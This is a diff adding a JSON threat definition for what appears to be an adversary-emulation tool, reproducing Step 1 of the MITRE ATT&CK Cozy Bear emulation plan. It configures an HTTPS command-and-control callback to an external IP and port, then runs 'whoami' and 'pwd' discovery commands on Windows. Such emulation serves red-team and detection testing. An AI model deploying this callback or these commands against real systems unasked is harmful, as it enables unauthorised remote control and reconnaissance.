@@ -1,0 +1,38 @@
+{
+    "threat": {
+        "category": "User-Defined", 
+        "description": "Cozy Bear Step 1 of the MITRE ATT&CK Evaluations Adversary Emulation Plan", 
+        "display_name": "CozyBear-Step1", 
+        "name": "CozyBear-Step1", 
+        "operating_system_name": "windows", 
+        "script": {
+            "0": {
+                "conf": "--cp 35.221.46.24:1234 --secure true", 
+                "module": "https", 
+                "type": "initialization"
+            }, 
+            "1": {
+                "module": "loader", 
+                "module_to_load": "run", 
+                "request": "--load run", 
+                "type": "message", 
+                "xrand": "6dcb09b9a8b027d5fb8f9882cb242c89"
+            }, 
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c whoami", 
+                "type": "message", 
+                "xrand": "e9ff9267a2269b3e15e0b1e415527442"
+            }, 
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "powershell.exe pwd", 
+                "type": "message", 
+                "xrand": "54224e819f748bc9c309078fe4f1d34d"
+            }
+        }, 
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
